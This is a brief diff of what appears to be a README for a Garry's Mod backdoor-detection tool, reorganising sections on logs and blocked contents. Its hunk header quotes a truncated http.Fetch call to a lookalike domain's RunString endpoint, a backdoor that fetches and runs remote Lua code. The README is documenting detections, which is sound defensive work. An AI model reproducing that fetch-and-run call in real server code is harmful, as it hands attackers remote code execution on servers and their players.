@@ -124,19 +124,14 @@ http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey
 </p>
 </details>
 
-<details><summary>3) Logs folder</summary>
+<details><summary>3) The logs are stored</summary>
 <p>
 <img src="https://i.imgur.com/DhGWEbU.png"/>
-</p>
-</details>
-
-<details><summary>4) General blocked executions log</summary>
-<p>
 <img src="https://i.imgur.com/XWCwr87.png"/>
 </p>
 </details>
 
-<details><summary>5) Detected contents</summary>
+<details><summary>4) We can see the blocked contents</summary>
 <p>
 
 - The first backdoor is dead, since the link inside the content doesn't work
